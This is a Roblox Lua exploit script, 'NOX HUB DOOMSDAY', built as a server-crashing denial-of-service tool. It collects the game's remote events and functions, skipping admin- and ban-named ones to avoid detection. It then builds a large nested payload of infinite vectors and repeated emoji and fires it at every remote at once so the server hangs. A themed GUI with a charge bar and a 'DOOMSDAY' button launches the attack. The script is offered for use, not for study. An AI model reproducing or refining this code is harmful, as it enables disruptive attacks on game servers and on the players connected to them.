--[[
    🔱 NOX HUB v13.0 [DOOMSDAY] 🔱
    "I will wait 10 seconds. You will wait forever."
    
    DOOMSDAY FEATURES:
    - [BUFFER OVERFLOW] : Generates a massive 1MB nested table payload.
    - [CHARGE MECHANIC] : Takes 10s to build memory pressure locally.
    - [BURST FIRE] : Sends the massive payload to ALL remotes in ONE frame.
    - [SERVER HANG] : Forces the server to deserialize complex data, freezing it.
]]

-- // CORE //
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local CoreGui = game:GetService("CoreGui")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local LocalPlayer = Players.LocalPlayer

-- // 1. DOOMSDAY ENGINE //
local Engine = {
    Charging = false,
    Payload = nil,
    Targets = {}
}

function Engine:Scan()
    Engine.Targets = {}
    -- Find generic remotes only (Event/Function)
    for _, v in pairs(game:GetDescendants()) do
        if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
            -- Exclude Admin/Security to avoid instant kick
            if not (v.Name:lower():find("admin") or v.Name:lower():find("ban")) then
                 table.insert(Engine.Targets, v)
            end
        end
    end
end

function Engine:ChargeAndFire(updateCallback)
    if Engine.Charging then return end
    Engine.Charging = true
    Engine:Scan()
    
    -- STEP 1: CHARGE (Build the Payload)
    task.spawn(function()
        local ComplexTable = {}
        
        -- We build a deeply nested table to stress the Serializer
        -- This takes time and CPU, hence "10s Load"
        for i = 1, 100 do
            updateCallback(i/100, "GENERATING COMPLEX DATA LAYER " .. i)
            local layer = {}
            for j = 1, 50 do
                layer[tostring(j)] = Vector3.new(math.huge, math.huge, math.huge)
                layer[j] = string.rep("🔱", 100) -- UTF-8 Stress
            end
            table.insert(ComplexTable, layer)
            task.wait(0.05)
        end
        
        updateCallback(1, "OUTFITTING DOOMSDAY PACKET...")
        Engine.Payload = ComplexTable
        task.wait(1)
        
        -- STEP 2: FIRE (Burst)
        updateCallback(1, "FIRING BURST...")
        for _, r in pairs(Engine.Targets) do
            pcall(function()
                if r:IsA("RemoteEvent") then
                    r:FireServer(Engine.Payload)
                elseif r:IsA("RemoteFunction") then
                    task.spawn(function() r:InvokeServer(Engine.Payload) end)
                end
            end)
        end
        
        game:GetService("StarterGui"):SetCore("SendNotification", {Title="NOX", Text="DOOMSDAY EXECUTED. SERVER SHOULD HANG."})
        Engine.Charging = false
        updateCallback(0, "SYSTEM READY")
    end)
end

-- // 2. DOOMSDAY UI //
local Nox = {}

function Nox:CreateUI()
    for _, v in pairs(CoreGui:GetChildren()) do if v.Name:find("Nox") then v:Destroy() end end
    
    local Screen = Instance.new("ScreenGui")
    Screen.Name = "NoxDoomsday"
    pcall(function() Screen.Parent = CoreGui end)
    
    local Main = Instance.new("Frame", Screen)
    Main.Size = UDim2.new(0, 400, 0, 200)
    Main.Position = UDim2.new(0.5, -200, 0.5, -100)
    Main.BackgroundColor3 = Color3.fromRGB(10, 0, 0) -- Dark Red
    Main.BorderSizePixel = 2
    Main.BorderColor3 = Color3.fromRGB(150, 0, 0)
    
    -- BACKGROUND IMAGE
    local Bg = Instance.new("ImageLabel", Main)
    Bg.Size = UDim2.new(1, 0, 1, 0)
    Bg.Image = "rbxassetid://2634436868" -- Dark grunge
    Bg.ImageTransparency = 0.8
    Bg.ImageColor3 = Color3.fromRGB(255, 0, 0)
    Bg.BackgroundTransparency = 1
    
    -- HEADER
    local Title = Instance.new("TextLabel", Main)
    Title.Text = "NOX // DOOMSDAY v13.0"
    Title.Font = Enum.Font.GothamBlack
    Title.TextColor3 = Color3.fromRGB(255, 0, 0)
    Title.TextSize = 24
    Title.Size = UDim2.new(1, 0, 0, 40)
    Title.Position = UDim2.new(0, 0, 0, 10)
    Title.BackgroundTransparency = 1
    
    -- PROGRESS BAR
    local BarBg = Instance.new("Frame", Main)
    BarBg.Size = UDim2.new(0.8, 0, 0, 20)
    BarBg.Position = UDim2.new(0.1, 0, 0.4, 0)
    BarBg.BackgroundColor3 = Color3.fromRGB(30, 0, 0)
    BarBg.BorderSizePixel = 0
    
    local BarFill = Instance.new("Frame", BarBg)
    BarFill.Size = UDim2.new(0, 0, 1, 0)
    BarFill.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
    BarFill.BorderSizePixel = 0
    
    local StatusText = Instance.new("TextLabel", Main)
    StatusText.Text = "SYSTEM IDLE"
    StatusText.Size = UDim2.new(1, 0, 0, 20)
    StatusText.Position = UDim2.new(0, 0, 0.55, 0)
    StatusText.TextColor3 = Color3.fromRGB(150, 150, 150)
    StatusText.Font = Enum.Font.Code
    StatusText.TextSize = 14
    StatusText.BackgroundTransparency = 1
    
    -- BUTTON
    local Btn = Instance.new("TextButton", Main)
    Btn.Size = UDim2.new(0.6, 0, 0, 40)
    Btn.Position = UDim2.new(0.2, 0, 0.7, 0)
    Btn.BackgroundColor3 = Color3.fromRGB(50, 0, 0)
    Btn.Text = "INITIATE DOOMSDAY (10s)"
    Btn.TextColor3 = Color3.fromRGB(200, 200, 200)
    Btn.Font = Enum.Font.GothamBold
    Btn.TextSize = 16
    
    local BtnCorner = Instance.new("UICorner", Btn)
    BtnCorner.CornerRadius = UDim.new(0, 6)
    
    Btn.MouseButton1Click:Connect(function()
        if not Engine.Charging then
            Engine:ChargeAndFire(function(progress, status)
                TweenService:Create(BarFill, TweenInfo.new(0.1), {Size = UDim2.new(progress, 0, 1, 0)}):Play()
                StatusText.Text = status
                if progress == 1 then
                    -- Blink effect
                    for i=1,5 do
                        Btn.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
                        wait(0.1)
                        Btn.BackgroundColor3 = Color3.fromRGB(50, 0, 0)
                        wait(0.1)
                    end
                end
            end)
        end
    end)
    
    -- DRAG UI
    local dragging, dragInput, dragStart, startPos
    Main.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = true; dragStart = input.Position; startPos = Main.Position
        end
    end)
    UserInputService.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement and dragging then
            local delta = input.Position - dragStart
            Main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        end
    end)
    UserInputService.InputEnded:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseButton1 then dragging = false end end)
end

Nox:CreateUI()
